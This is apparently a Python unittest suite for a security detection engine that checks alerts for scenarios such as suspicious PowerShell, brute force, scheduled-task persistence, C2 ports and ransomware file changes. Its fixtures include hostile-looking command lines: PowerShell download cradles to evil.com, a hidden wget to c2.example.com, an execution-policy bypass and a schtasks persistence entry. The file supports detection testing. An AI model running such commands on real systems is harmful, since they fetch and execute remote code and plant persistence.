"""Tests for the AegisX Security Detection Engine.

Covers all 12 controlled SOC scenarios plus hard-negative exclusions.
Uses NormalizedEvent from the existing ingestion pipeline to verify
the full detection contract: evaluate(event) -> list[Alert].
"""

import unittest
from ai.ingestion.types import CanonicalEvent, Format
from ai.ingestion.processing import NormalizedEvent

from backend.detection.engine import DetectionEngine
from backend.detection.models import Alert, AlertSeverity, DetectionType


def _make_event(
    event_id="test-001",
    event_type="process_creation",
    hostname="WS-001",
    username="jdoe",
    process_name="",
    command_line="",
    source_ip=None,
    dest_ip=None,
    port=None,
    dest_port=None,
    protocol=None,
    domain=None,
    file_path=None,
    file_hash=None,
    severity=None,
    status=None,
    attributes=None,
) -> NormalizedEvent:
    """Helper to create a NormalizedEvent for testing."""
    canonical = CanonicalEvent(
        event_id=event_id,
        source_name="test",
        source_format=Format.JSON,
        event_type=event_type,
        hostname=hostname,
        username=username,
        process_name=process_name,
        command_line=command_line,
        source_ip=source_ip,
        dest_ip=dest_ip,
        port=port,
        dest_port=dest_port,
        protocol=protocol,
        domain=domain,
        file_path=file_path,
        file_hash=file_hash,
        severity=severity,
        status=status,
        attributes=attributes or {},
    )
    return NormalizedEvent(event=canonical)


class TestDetectionEngineContract(unittest.TestCase):
    """Verify the detection engine API contract."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_evaluate_returns_list(self):
        """evaluate() must return a list of Alert objects."""
        event = _make_event()
        result = self.engine.evaluate(event)
        self.assertIsInstance(result, list)

    def test_evaluate_empty_for_benign_event(self):
        """Benign event should produce no alerts."""
        event = _make_event(
            process_name="notepad.exe",
            command_line="notepad.exe C:\\docs\\readme.txt",
        )
        alerts = self.engine.evaluate(event)
        self.assertEqual(len(alerts), 0)

    def test_rule_count(self):
        """Engine should have at least 10 rules."""
        self.assertGreaterEqual(self.engine.rule_count, 10)

    def test_alert_has_provenance(self):
        """Generated alerts must retain full provenance."""
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -EncodedCommand ZABpAHIAIABDADoAXA==",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        alert = alerts[0]
        self.assertIsNotNone(alert.rule_id)
        self.assertIsNotNone(alert.rule_name)
        self.assertEqual(alert.source_event_id, "test-001")
        self.assertIsNotNone(alert.mitre_technique_id)


class TestSuspiciousPowerShell(unittest.TestCase):
    """Scenario 2: Suspicious PowerShell execution."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_encoded_command_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -EncodedCommand ZABpAHIAIABDADoAXA==",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        self.assertEqual(alerts[0].mitre_technique_id, "T1059.001")

    def test_download_cradle_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line='powershell.exe IEX(New-Object Net.WebClient).DownloadString("http://evil.com/payload")',
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)

    def test_execution_policy_bypass_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -ExecutionPolicy Bypass -File dropper.ps1",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)

    def test_hidden_window_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -WindowStyle Hidden -NoProfile -Command wget http://c2.example.com",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)


class TestBenignPowerShell(unittest.TestCase):
    """Scenario 1: Benign PowerShell administration (hard negative)."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_get_service_not_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe Get-Service",
        )
        alerts = self.engine.evaluate(event)
        self.assertEqual(len(alerts), 0)

    def test_get_process_not_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe Get-Process | Sort-Object CPU -Descending",
        )
        alerts = self.engine.evaluate(event)
        self.assertEqual(len(alerts), 0)

    def test_get_eventlog_not_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe Get-EventLog -LogName System -Newest 50",
        )
        alerts = self.engine.evaluate(event)
        self.assertEqual(len(alerts), 0)


class TestBruteForceAuth(unittest.TestCase):
    """Scenario 3: Brute-force authentication."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_failed_login_detected(self):
        event = _make_event(
            event_type="authentication",
            username="admin",
            source_ip="10.0.0.50",
            status="failure",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        self.assertEqual(alerts[0].mitre_technique_id, "T1110")

    def test_successful_login_not_flagged_as_brute_force(self):
        event = _make_event(
            event_type="authentication",
            username="admin",
            source_ip="10.0.0.1",
            status="success",
        )
        alerts = self.engine.evaluate(event)
        # Successful login should not trigger brute-force rule
        brute_force_alerts = [a for a in alerts if a.rule_id == "AX-RULE-002"]
        self.assertEqual(len(brute_force_alerts), 0)


class TestLoginAnomaly(unittest.TestCase):
    """Scenario 4: Suspicious login anomaly."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_off_hours_login_detected(self):
        event = _make_event(
            event_type="authentication",
            username="jdoe",
            source_ip="10.0.0.100",
            status="success",
            attributes={"off_hours": True},
        )
        alerts = self.engine.evaluate(event)
        anomaly_alerts = [a for a in alerts if a.rule_id == "AX-RULE-003"]
        self.assertGreater(len(anomaly_alerts), 0)

    def test_impossible_travel_detected(self):
        event = _make_event(
            event_type="authentication",
            username="jdoe",
            source_ip="203.0.113.5",
            status="success",
            attributes={"impossible_travel": True},
        )
        alerts = self.engine.evaluate(event)
        anomaly_alerts = [a for a in alerts if a.rule_id == "AX-RULE-003"]
        self.assertGreater(len(anomaly_alerts), 0)


class TestScheduledTaskPersistence(unittest.TestCase):
    """Scenario 5: Scheduled task persistence."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_schtasks_create_detected(self):
        event = _make_event(
            process_name="schtasks.exe",
            command_line='schtasks /create /tn "Updater" /tr "C:\\malware.exe" /sc onlogon',
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        self.assertEqual(alerts[0].mitre_technique_id, "T1053.005")

    def test_new_scheduled_task_detected(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'beacon.exe')",
        )
        alerts = self.engine.evaluate(event)
        # Should trigger both scheduled task AND possibly suspicious PS rules
        sched_alerts = [a for a in alerts if a.rule_id == "AX-RULE-004"]
        self.assertGreater(len(sched_alerts), 0)


class TestOfficeSpawnShell(unittest.TestCase):
    """Scenario 6: Office → PowerShell chain."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_word_spawns_powershell(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -NoProfile -Command Get-Content",
            attributes={"parent_process": "WINWORD.EXE"},
        )
        alerts = self.engine.evaluate(event)
        office_alerts = [a for a in alerts if a.rule_id == "AX-RULE-005"]
        self.assertGreater(len(office_alerts), 0)
        self.assertEqual(office_alerts[0].severity, AlertSeverity.CRITICAL)

    def test_excel_spawns_cmd(self):
        event = _make_event(
            process_name="cmd.exe",
            command_line="cmd.exe /c whoami",
            attributes={"parent_process": "EXCEL.EXE"},
        )
        alerts = self.engine.evaluate(event)
        office_alerts = [a for a in alerts if a.rule_id == "AX-RULE-005"]
        self.assertGreater(len(office_alerts), 0)


class TestSuspiciousOutbound(unittest.TestCase):
    """Scenario 7: Suspicious outbound connection."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_c2_port_detected(self):
        event = _make_event(
            event_type="network_connection",
            source_ip="10.0.0.5",
            dest_ip="203.0.113.100",
            dest_port=4444,
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        self.assertEqual(alerts[0].mitre_tactic, "command_and_control")

    def test_normal_port_not_flagged(self):
        event = _make_event(
            event_type="network_connection",
            source_ip="10.0.0.5",
            dest_ip="8.8.8.8",
            dest_port=443,
        )
        alerts = self.engine.evaluate(event)
        outbound_alerts = [a for a in alerts if a.rule_id == "AX-RULE-006"]
        self.assertEqual(len(outbound_alerts), 0)


class TestRansomwareFileMod(unittest.TestCase):
    """Scenario 8: Ransomware-like mass file modification."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_encrypted_extension_detected(self):
        event = _make_event(
            event_type="file_modification",
            file_path="C:\\Users\\jdoe\\Documents\\report.docx.encrypted",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)
        self.assertEqual(alerts[0].severity, AlertSeverity.CRITICAL)
        self.assertEqual(alerts[0].mitre_technique_id, "T1486")

    def test_ransom_note_detected(self):
        event = _make_event(
            event_type="file_modification",
            file_path="C:\\Users\\jdoe\\Desktop\\HOW_TO_DECRYPT.txt",
        )
        alerts = self.engine.evaluate(event)
        self.assertGreater(len(alerts), 0)


class TestHardNegativeExclusions(unittest.TestCase):
    """Scenarios 9-10: Authorized scanner and approved deployment hard negatives."""

    def setUp(self):
        self.engine = DetectionEngine()

    def test_authorized_scanner_suppressed(self):
        """Authorized security scanner should NOT trigger alerts."""
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -EncodedCommand ZABpAHIAIABDADoAXA==",
            attributes={"authorized_scanner": True},
        )
        alerts = self.engine.evaluate(event)
        # The suspicious PS rule has "authorized_scanner" exclusion
        ps_alerts = [a for a in alerts if a.rule_id == "AX-RULE-001"]
        self.assertEqual(len(ps_alerts), 0)

    def test_approved_deployment_suppressed(self):
        """Approved IT deployment should NOT trigger persistence alerts."""
        event = _make_event(
            process_name="schtasks.exe",
            command_line='schtasks /create /tn "Updater" /tr "C:\\deploy.exe" /sc daily',
            attributes={"approved_deployment": True},
        )
        alerts = self.engine.evaluate(event)
        sched_alerts = [a for a in alerts if a.rule_id == "AX-RULE-004"]
        self.assertEqual(len(sched_alerts), 0)

    def test_scanner_service_account_suppressed(self):
        """Scanner service accounts should be suppressed."""
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -EncodedCommand ZABpAHIAIABDADoAXA==",
            username="svc_scanner_prod",
        )
        alerts = self.engine.evaluate(event)
        ps_alerts = [a for a in alerts if a.rule_id == "AX-RULE-001"]
        self.assertEqual(len(ps_alerts), 0)


class TestAlertToTriageBridge(unittest.TestCase):
    """Verify Alert.to_triage_input() produces valid TriageAgent input."""

    def test_triage_input_structure(self):
        event = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe IEX(DownloadString('http://evil.com'))",
            hostname="WS-001",
            username="jdoe",
        )
        engine = DetectionEngine()
        alerts = engine.evaluate(event)
        self.assertGreater(len(alerts), 0)

        triage_input = alerts[0].to_triage_input()
        self.assertIn("alert", triage_input)
        self.assertIn("context", triage_input)
        self.assertIn("evidence", triage_input)
        self.assertIsInstance(triage_input["evidence"], list)
        self.assertGreater(len(triage_input["evidence"]), 0)
        self.assertIn("id", triage_input["evidence"][0])
        self.assertIn("type", triage_input["evidence"][0])
        self.assertIn("description", triage_input["evidence"][0])


class TestDetectionStats(unittest.TestCase):
    """Verify detection engine statistics tracking."""

    def test_stats_tracking(self):
        engine = DetectionEngine()

        # Evaluate a benign event
        benign = _make_event(process_name="notepad.exe", command_line="notepad.exe")
        engine.evaluate(benign)
        self.assertEqual(engine.stats.events_evaluated, 1)
        self.assertEqual(engine.stats.alerts_generated, 0)

        # Evaluate a malicious event
        malicious = _make_event(
            process_name="powershell.exe",
            command_line="powershell.exe -EncodedCommand base64payload",
        )
        engine.evaluate(malicious)
        self.assertEqual(engine.stats.events_evaluated, 2)
        self.assertGreater(engine.stats.alerts_generated, 0)

    def test_stats_reset(self):
        engine = DetectionEngine()
        engine.evaluate(_make_event())
        engine.stats.reset()
        self.assertEqual(engine.stats.events_evaluated, 0)


class TestBatchEvaluation(unittest.TestCase):
    """Verify batch evaluation."""

    def test_evaluate_batch(self):
        engine = DetectionEngine()
        events = [
            _make_event(event_id="ev-001", process_name="notepad.exe"),
            _make_event(
                event_id="ev-002",
                process_name="powershell.exe",
                command_line="powershell.exe -Enc ZABpAHIA",
            ),
            _make_event(
                event_id="ev-003",
                event_type="network_connection",
                dest_port=4444,
                dest_ip="10.0.0.99",
            ),
        ]
        alerts = engine.evaluate_batch(events)
        self.assertIsInstance(alerts, list)
        # At least the PS and network events should fire
        self.assertGreaterEqual(len(alerts), 2)


if __name__ == "__main__":
    unittest.main()
